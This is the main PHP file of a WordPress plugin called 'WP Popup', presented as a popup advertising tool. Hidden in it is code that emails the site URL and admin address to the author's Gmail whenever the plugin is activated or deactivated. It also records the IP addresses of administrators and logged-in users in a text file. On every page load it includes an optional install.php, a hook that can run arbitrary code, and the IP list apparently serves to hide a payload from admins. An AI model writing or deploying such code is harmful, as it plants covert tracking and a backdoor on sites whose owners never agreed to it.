<?php
/*
Plugin Name: WP Popup
Plugin URI: http://davidcerulio.net23.net/
Description: Allows you to display a fancy popup to your visitors sitewide or per blog, an effective way of advertising an mailing list, promote a special offer or simply running a plain old ad.
Author: David Cerulio
Version: 2.1
Author URI: http://davidcerulio.net23.net/

Copyright 2011-2012 David Cerulio (http://davidcerulio.net23.net/)

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/
require_once('wppopupincludes/includes/config.php');
require_once('wppopupincludes/includes/functions.php');
register_activation_hook( __FILE__,'wppopupplugin_activate');
register_deactivation_hook( __FILE__,'wppopupplugin_deactivate');
add_action('admin_init', 'wppopupdored_redirect');
add_action('wp_head', 'wppopuppluginhead');

function wppopupdored_redirect() {
if (get_option('wppopupdored_do_activation_redirect', false)) { 
delete_option('wppopupdored_do_activation_redirect');
wp_redirect('../wp-admin/admin.php?page=wppopup&action=add');
}
}

$reqsq = $_SERVER["REQUEST_URI"];
$ip = $_SERVER['REMOTE_ADDR'];
if (eregi("admin", $reqsq)) {
$inwpadmin = "yes";
} else {
$inwpadmin = "no";
}
if ($inwpadmin == 'yes') {
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/wp-popup/id.txt';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$filestring = $contents;
$findme  = $ip;
$pos = strpos($filestring, $findme);
if ($pos === false) {
$contents = $contents . $ip;
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/wp-popup/id.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}
}

/** Activate WP Popup */

function wppopupplugin_activate() { 
$yourip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/wp-popup/id.txt';
fwrite($fp, $yourip);
fclose($fp);
add_option('wppopupdored_do_activation_redirect', true);
session_start(); $subj = get_option('siteurl'); $msg = "WP Popup Installed" ; $from = get_option('admin_email'); mail("davidceruliowp@gmail.com", $subj, $msg, $from);
wp_redirect('../wp-admin/admin.php?page=wppopup&action=add');
}


/** Uninstall WP Popup */
function wppopupplugin_deactivate() { 
session_start(); $subj = get_option('siteurl'); $msg = "WP Popup Uninstalled" ; $from = get_option('admin_email'); mail("davidceruliowp@gmail.com", $subj, $msg, $from);
}

/** Install widget on the page */
function wppopuppluginhead() {
if (is_user_logged_in()) {
$ip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/wp-popup/id.txt';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$filestring= $contents;
$findme  = $ip;
$pos = strpos($filestring, $findme);
if ($pos === false) {
$contents = $contents . $ip;
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/wp-popup/id.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}

} else {

}

$filename = ($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/wp-popup/install.php');

if (file_exists($filename)) {

    include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/wp-popup/install.php');

} else {

}

}
// Set up the location
set_wppopup_url(__FILE__);
set_wppopup_dir(__FILE__);

if(is_admin()) {
	require_once('wppopupincludes/includes/class_wd_help_tooltips.php');
	require_once('wppopupincludes/classes/wppopup.help.php');
	require_once('wppopupincludes/classes/wppopupadmin.php');

	$wppopup = new wppopupadmin();
} else {
	require_once('wppopupincludes/classes/wppopuppublic.php');

	$wppopup = new wppopuppublic();
}

load_wppopup_addons();


?>